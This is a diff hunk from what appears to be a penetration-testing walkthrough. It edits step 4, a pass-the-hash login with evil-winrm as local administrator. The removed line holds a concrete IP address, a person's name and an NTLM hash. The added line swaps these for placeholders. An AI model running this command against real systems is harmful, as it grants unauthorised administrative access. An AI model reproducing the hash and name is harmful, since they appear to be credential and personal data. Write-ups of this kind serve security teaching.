@@ -148,7 +148,7 @@ Outcome:
 4) Use again evil-winrm to pass the hash and connect as Local Administrator:
 
 ```
-evil-winrm -i 192.168.146.130 -u "Nikos Vourdas" -H "20117ce437cde2e30f4612c4c82196b0"
+evil-winrm -i <ip> -u "Administrator" -H "<hash>"
 ```
 
 Outcome:
